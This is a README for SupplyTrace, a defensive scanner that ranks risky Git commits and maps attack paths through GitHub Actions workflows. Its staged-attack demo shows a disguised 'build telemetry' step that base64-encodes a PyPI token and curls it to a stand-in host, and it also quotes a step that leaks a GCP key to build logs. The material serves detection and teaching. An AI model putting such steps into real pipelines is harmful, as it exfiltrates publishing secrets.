# SupplyTrace

A tool that helps find **software supply chain attacks** — in a repository's Git
history, and in its CI/CD pipeline.

It has two halves that feed each other:

| Phase | Command | Question it answers |
|---|---|---|
| **Git history** | `supplytrace investigate` | *Which commits should I read first?* |
| **CI/CD + attack DAG** | `cicd_detector scan` | *What can an attacker actually do to this pipeline, and how?* |

The second half is built on the first: it reuses the same Git analyzer, the same
evidence model, and the same hardened Git layer rather than re-implementing them.

---

## The problem

When someone attacks a software project, they usually don't touch the
application code. They change **how the code gets built** — the CI workflow — or
**what it gets built from** — the dependency files. In `git log`, those commits
look exactly like every other commit.

The March 2025 `tj-actions/changed-files` compromise is the canonical example.
Nobody pushed a commit to the victim repositories. An attacker moved a *tag* in
somebody else's repository, and thousands of workflows that referenced
`@v35` started running attacker code on their next run, with the victim's
secrets in the environment.

Nothing in the victim's `git log` changed. That is the shape of the problem.

---

## Part 1 — Git history analysis

Git treats every file as plain text. It has no idea that
`.github/workflows/build.yml` controls how the software is built while
`README.md` controls nothing.

So SupplyTrace labels every changed file by its **role**:

| File | Role |
|---|---|
| `src/app.py` | SOURCE |
| `.github/workflows/build.yml` | WORKFLOW — *how it's built* |
| `package.json` | DEPENDENCY_MANIFEST — *what it says it needs* |
| `package-lock.json` | LOCKFILE — *what it actually installs* |

Then it looks for **odd combinations** of those roles:

- one commit changed a workflow **and** a dependency file
- a lockfile changed **without** the manifest changing
  (the installed packages changed, but nobody asked for a new package)

Commits are scored by how many rules fire, and printed highest first. The
individual signals are **observed**; the resulting ranking is **inferred** — a
reading order, not an accusation.

```bash
supplytrace analyze     ./repo     # history, authors, file changes
supplytrace investigate ./repo     # commits ranked by review priority
supplytrace commit      ./repo <sha>
```

---

## Part 2 — CI/CD attack detector + attack DAG

Reads `.github/workflows/*.yml`, runs eleven detection rules, builds a directed
graph of the pipeline, and searches that graph for routes an attacker could take
from an entry point to something of value.

```
 workflows ──► parser ──► rules ──► findings ──┐
                                               ├──► attack DAG ──► attack paths ──► report
 git history ──► workflow-change analysis ─────┘                                       │
                                                                    (optional) Gemini ─┘
```

### Install

```bash
python -m venv .venv
source .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -e ".[dev]"
```

Requires Python 3.11+. Dependencies: `pydantic`, `PyYAML`, `networkx`.
The LLM step is an extra: `pip install -e ".[dev,llm]"`.

### Run it

```bash
python -m cicd_detector scan  ./repo               # findings + attack paths
python -m cicd_detector scan  ./repo --no-llm      # never contacts the network
python -m cicd_detector scan  ./repo --format json
python -m cicd_detector graph ./repo               # export the DAG
python -m cicd_detector analyze ./repo             # every finding, in full
python -m cicd_detector rules                      # what it looks for
```

`cicd_detector` is a thin entry point over `supplytrace.cicd`, so the detector
lives in the same codebase — reusing the Git analyzer, evidence model and
hardened Git layer — while still being reachable under the name the spec uses.
The two CLIs stay separate: `supplytrace` keeps its original three commands
untouched, and `cicd_detector` adds the four new ones.

---

## Proof: running it against GitHub Actions Goat

[GitHub Actions Goat](https://github.com/step-security/github-actions-goat) is
StepSecurity's deliberately-vulnerable Actions repository. It is the primary
test target because its weaknesses are *real and documented*, including a
workflow reproducing the actual tj-actions incident.

```bash
git clone https://github.com/step-security/github-actions-goat.git
python -m cicd_detector scan ./github-actions-goat --no-llm --top 5
```

**Actual output** (abridged; 24/24 workflows parsed, 0 rule errors):

```
==========================================================================
CI/CD SECURITY ANALYSIS
==========================================================================

SCOPE
-----
  repository        : ./github-actions-goat
  workflows parsed  : 24 of 24
  git history       : 456 commits, 152 touching workflows

FINDINGS (229)
--------------
  CRITICAL=5  HIGH=48  MEDIUM=12  LOW=163  INFO=1

  CRITICAL F001  ACTION_UNPINNED    .github/workflows/hosted-file-monitor-with-hr.yml:20
           Unpinned action madhead/semver-utils@latest
           | - uses: madhead/semver-utils@latest
           confidence 0.95 (inferred)

  CRITICAL F004  DANGEROUS_TRIGGER  .github/workflows/toc-tou.yml:4
           pull_request_target in job 'vulnerable-pattern': outsider code reaches a privileged runner
           | pull_request_target:
           | run: |
           confidence 0.90 (inferred)

ATTACK GRAPH
------------
  nodes             : 516
  edges             : 3163
  node types        : action=73, author=8, commit=125, external_host=3, finding=53,
                      github_token=21, input=2, job=26, repository=1, runner=26,
                      secret=17, shell_command=4, step=108, trigger=25, workflow=24
```

### It finds the real tj-actions bug

The Goat repo contains `tj-actions-changed-files-incident.yaml`, reproducing
CVE-2025-30066 / GHSL-2023-271. The detector locates both halves of it:

```
HIGH     F052  SCRIPT_INJECTION   tj-actions-changed-files-incident.yaml:33
         steps.changed-files.outputs.all_changed_files interpolated into a run command
         | for file in ${{ steps.changed-files.outputs.all_changed_files }}; do

MEDIUM   F060  ACTION_UNPINNED    tj-actions-changed-files-incident.yaml:29
         Unpinned action tj-actions/changed-files@v35
         | uses: tj-actions/changed-files@v35
```

Line 33 and line 29 are correct — open the file and check.

### It grades rather than shouts

`toc-tou.yml` contains a job the Goat repo labels vulnerable and one it labels
secure. `PRTargetWorkflow.yml` uses `pull_request_target` with a *bare*
checkout. All three use the same trigger; the detector separates them:

| Workflow / job | Verdict | Why |
|---|---|---|
| `toc-tou.yml` · `vulnerable-pattern` | **CRITICAL** | `gh pr checkout` of PR code, then runs commands |
| `PRTargetWorkflow.yml` · `pr-target-check` | **LOW** | bare `actions/checkout` gets the *base* branch, not the fork's code |

A scanner that flags every `pull_request_target` equally would call these the
same thing. Both statements above are true of the same trigger.

### And it stays quiet on decoys

`secret-in-build-log.yml` has two `echo`s in a step holding a GCP key. Only one
of them actually leaks:

```yaml
PRIVATE_KEY=$(echo $GCP_SERVICE_ACCOUNT_KEY | jq -r '.private_key')
echo "Using the private key for some operation"     # ← decoy, not reported
echo "GCP Private Key: $PRIVATE_KEY"                # ← reported, line 29
```

```
MEDIUM   F062  SECRET_EXPOSURE   secret-in-build-log.yml:29
         GCP_SERVICE_ACCOUNT_KEY is written to the build log in job 'build'
         | echo "GCP Private Key: $PRIVATE_KEY"
```

This is taint tracking, not pattern matching: the value is followed from
`secrets.GCP_SERVICE_ACCOUNT_KEY` → `$GCP_SERVICE_ACCOUNT_KEY` → `$PRIVATE_KEY`
→ the sink. It is also marked `derived: true`, which matters — GitHub masks the
*exact* secret string in logs, and a value that has been through `jq` no longer
matches the mask, so it prints in the clear.

---

## Proof: the staged-attack demo repository

Goat demonstrates vulnerable *workflows*. It does not demonstrate a vulnerable
*history* — its commits are ordinary project work. So the repo ships a generator
for the missing half:

```bash
python examples/build_cicd_demo.py ./demo
python -m cicd_detector scan ./demo --no-llm
```

It builds a small project whose pipeline starts hardened, then walks it through
the change sequence a real compromise looks like. **No single commit is
obviously malicious** — that is the point:

| Commit | Change | How it reads in review |
|---|---|---|
| **C1** | adds `build-helpers/version-utils@v2` | "stop hand-maintaining the version string" |
| **C2** | `contents/packages/id-token: write` | "the release job needs to push the package" |
| **C3** | adds a build-telemetry step | "track release durations" |

C3 is the payload:

```yaml
- name: Report build telemetry
  env:
    RELEASE_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
  run: |
    BUILD_ID=$(echo "$RELEASE_TOKEN" | base64 -w0)
    curl -sS -X POST -d "build=$BUILD_ID" https://build-telemetry.example.net/ingest
```

**Actual output:**

```
FINDINGS (18)
-------------
  CRITICAL=4  HIGH=3  MEDIUM=4  LOW=5  INFO=2

  CRITICAL F004  SECRET_EXPOSURE   .github/workflows/release.yml:30
           PYPI_API_TOKEN is sent to a remote host in job 'build'
           | curl -sS -X POST -d "build=$BUILD_ID" https://build-telemetry.example.net/ingest

  HIGH     F005  ACTION_UNPINNED   .github/workflows/release.yml:20
           Unpinned action build-helpers/version-utils@v2
```

Note that F004 fires even though the token is never named on the `curl` line —
it arrives as `$BUILD_ID`, two assignments away.

### The attack paths it reconstructs

```
ATTACK PATHS (4)
----------------
  Each path below is a route that EXISTS IN THE CONFIGURATION.
  The tool has not established that anyone has taken it.

--------------------------------------------------------------------------
  AP006  HIGH  POTENTIAL_ATTACK_PATH  confidence 0.80
  Code running in the job can send a secret to an external host

  1. step 'Report build telemetry' executes on runner 'ubuntu-latest (build)'
  2. runner 'ubuntu-latest (build)' has access to secret 'PYPI_API_TOKEN'
  3. secret 'PYPI_API_TOKEN' can be sent to external_host 'build-telemetry.example.net'

  evidence  : F004
  unknown   :
              - whether the workflow has ever run on an outsider-supplied event

--------------------------------------------------------------------------
  AP002  HIGH  POTENTIAL_ATTACK_PATH  confidence 0.77
  A mutable third-party action reaches a token that can write the repository

  1. action 'build-helpers/version-utils@v2' executes on step 'Derive version metadata'
  2. step 'Derive version metadata' executes on runner 'ubuntu-latest (build)'
  3. runner 'ubuntu-latest (build)' has access to github_token 'GITHUB_TOKEN'
  4. github_token 'GITHUB_TOKEN' grants permission 'contents: write'
  5. permission 'contents: write' enables writing to repository 'this repository'

  evidence  : F005
  unknown   :
              - whether the referenced tag currently points at the reviewed revision
```

AP002 is the tj-actions attack shape, stated generically: *if that publisher is
compromised, they get commit access to this repository.*

---

## The attack DAG

```bash
python -m cicd_detector graph ./demo --output-dir ./graph
```

```
attack graph: 48 nodes, 104 edges
attack paths: 4
  json      ./graph/attack_graph.json
  dot       ./graph/attack_graph.dot
  graphml   ./graph/attack_graph.graphml

Render the diagram with:
  dot -Tsvg ./graph/attack_graph.dot -o attack_graph.svg
```

The graph carries two layers over one set of nodes:

- **structural** edges from the workflow files (workflow *contains* job, step
  *invokes* action) — always true, always observed;
- **security** edges from findings (input *interpolated_into* command, secret
  *sends_to* host) — which exist **only where a rule produced evidence**.

Every node and edge stores the finding IDs that justify it, and
`add_edge` **refuses** a security edge with no evidence, recording the refusal.
An unevidenced edge would let the path search build a route nobody can check.

Nodes carry a **role** — `ENTRY_POINT → EXECUTION → PRIVILEGE → ASSET → IMPACT` —
and paths are searched on roles rather than hard-coded node sequences, so a
chain expressed slightly differently still matches. The DOT export groups nodes
by role, so a rendered graph reads left-to-right in attack order.

### Three graph bugs worth knowing about

The graph was built, then run against real data, and the first version
confidently produced **attack paths that did not exist**. All three are fixed,
and each has a regression test in `tests/test_cicd_graph.py`:

1. **Shared runner node.** Keyed on `runs-on`, so all 26 Goat jobs shared one
   `ubuntu-latest` node — joining every unrelated workflow through it.
2. **Shared action node.** `actions/checkout` was one node, so a path could
   enter `toc-tou.yml` and *exit through a different workflow's runner*.
3. **Severity inflation.** Paths scored on every finding attached to any node
   along the route, so one unrelated CRITICAL promoted everything to CRITICAL.

The lesson generalises: in a graph used for reachability, any node shared
between contexts is a false-transitivity bug waiting to happen.

---

## Detection rules

```
$ python -m cicd_detector rules

11 detection rules:

  ACTION_UNPINNED            Third-party action is not pinned to a commit SHA
  EXCESSIVE_PERMISSIONS      Job holds write permissions on the GITHUB_TOKEN
  DANGEROUS_TRIGGER          Privileged trigger combined with untrusted code or input
  SCRIPT_INJECTION           Attacker-controlled expression interpolated into a command
  SECRET_EXPOSURE            A secret's value reaches a sink that can leak it
  REMOTE_CODE_FETCH          Remote content is downloaded and executed
  UNTRUSTED_CODE_EXECUTION   Fork-controlled code executes with base-repository privileges
  ARTIFACT_TAMPERING         An artifact can be modified between creation and use
  RELEASE_RISK               A publishing job is exposed to an upstream weakness
  THIRD_PARTY_ACTION         Inventory of external actions and their reach
  WORKFLOW_HISTORY_CHANGE    A commit changed a workflow's security posture

Use --explain RULE_ID for the reasoning behind one.
```

Each rule is graded rather than binary. `ACTION_UNPINNED` alone spans four
severities depending on what the reference can reach:

| Reference | Severity | Reasoning |
|---|---|---|
| `evil/action@main` in a job with write perms | CRITICAL | branch ref, moves on every push, reaches privileges |
| `vendor/tool@v1.2.3` in a job with secrets | HIGH | mutable tag, reaches credentials |
| `vendor/tool@v1` in a job with nothing | MEDIUM | mutable, but reaches little |
| `actions/checkout@v4` | LOW | mutable, but published by the platform you already trust |
| `actions/checkout@8f4b7f8…` (40-hex) | *not reported* | immutable |

---

## The LLM layer (optional, and genuinely optional)

**The deterministic engine needs no API key and no network.** Every finding and
every attack path shown above was produced with `--no-llm`, entirely offline.

Gemini does **not** scan the repository and performs **no detection**. It
receives what the rules already established — findings with IDs and verbatim
snippets, the attack paths, and the Git history — and writes a correlation over
them.

To enable it, get a key from [aistudio.google.com](https://aistudio.google.com/apikey):

```bash
export GEMINI_API_KEY=...       # PowerShell: $env:GEMINI_API_KEY="..."
python -m cicd_detector scan ./demo         # note: no --no-llm
```

Without a key the step is **skipped and says so** — it is never faked:

```
LLM CORRELATION
---------------
  skipped: no LLM provider configured (set GEMINI_API_KEY to enable correlation)
```

Three constraints hold at that boundary:

1. **It can only cite what it was given.** The prompt carries an explicit set of
   allowed finding IDs. A response citing anything else has those citations
   stripped and the invention recorded. A "chain" left with no valid evidence is
   downgraded to `INSUFFICIENT_EVIDENCE`.
2. **It cannot claim an attack happened.** The verdict vocabulary has no value
   for it. `POTENTIAL_ATTACK_CHAIN` is the strongest thing it can say.
3. **Its failure costs nothing.** No key, no network, malformed JSON, invented
   IDs — each returns a reason, and the deterministic report prints unchanged.

The report keeps the model's output in its own section, labelled as
interpretation rather than evidence.

---

## Tests

```bash
pytest -q                      # full suite
pytest tests/ -k cicd -q       # the CI/CD detector's 135
```

```
135 passed          tests/test_cicd_{parser,rules,graph,llm,cli}.py
342 passed          full suite
```

- one test per rule, asserting **rule ID, severity, and file:line** — a rule
  that fires at the wrong location is not a working rule;
- negative cases for every rule, because a detector that cannot stay quiet gets
  switched off;
- the graph-soundness regressions described above;
- `test_untrusted_input_to_secret_path`, the chain the spec names;
- LLM tests using a fake provider — **no test needs a key or a network**.

> **Note on 11 pre-existing failures.** On Windows, 11 of Rohit's original tests
> fail because they deliberately create filenames containing newlines, tabs and
> non-UTF-8 bytes, which NTFS forbids. They fail identically on the unmodified
> commit (verified by stashing), and pass on Linux.

---

## Design principles

1. **Deterministic detection first.** The LLM is an analyst, never the scanner.
2. **Every conclusion traces to evidence.** A finding with no citation is
   dropped by the collector; an unevidenced graph edge is refused.
3. **Three things stay separate**: `OBSERVED` fact, `INFERRED` security
   judgement, and LLM hypothesis. Each is labelled in the output.
4. **Never claim an attack occurred.** A static read can show that a
   configuration *permits* an attack. It cannot show anyone took it — so
   `POTENTIAL_ATTACK_PATH` is the ceiling, and every path lists what it could
   not establish.
5. **Say when you couldn't look.** An unparseable workflow becomes a finding:
   "nothing was checked" differs from "nothing is wrong".
6. **Grade, don't shout.** Severity depends on reachability. `pull_request_target`
   is INFO or CRITICAL depending on what the job does with it.
7. **Read, never execute.** A repository's own Git config can make Git run
   programs; the hardened runner refuses. Nothing from a scanned repo is run.

---

## Limitations

Worth stating plainly, because a security tool that oversells is worse than none:

- **Effective permissions can be unknowable.** With no `permissions:` block, the
  token's scopes come from repository settings that are not in the files. The
  tool reports that it cannot tell, rather than guessing.
- **Tags are not resolved.** `@v35` is flagged as mutable, but the tool does not
  fetch the action to see where it points *now*. That needs network access and
  is listed under each path's `unknown`.
- **Taint tracking is shallow.** It follows assignment and command substitution
  within one `run:` block. It does not model control flow, arrays, or values
  crossing between steps.
- **Reachable ≠ exploited.** Whether a workflow has ever run on an
  outsider-supplied event is in the Actions run log, not the repository.
- **Composite and reusable workflows** are recorded but not followed into.

## Layout

```
supplytrace/
  analyzers/          Git history analysis (Phase 1)
  models/             commits, files, evidence, signals
  core/               hardened git runner, config, errors
  cicd/               ── the CI/CD attack detector ──
    parser/           workflow.py  yamlsrc.py  expressions.py  shell.py  taint.py
    rules/            one module per rule + base.py, history.py
    evidence/         models.py (Finding), collector.py
    graph/            models.py  builder.py  correlation.py  export.py
    llm/              base.py  gemini.py  prompts.py  schemas.py
    reporting/        text.py  json_report.py
    cli.py
cicd_detector/        entry point for `python -m cicd_detector`
examples/             build_demo.py, build_cicd_demo.py
tests/
```
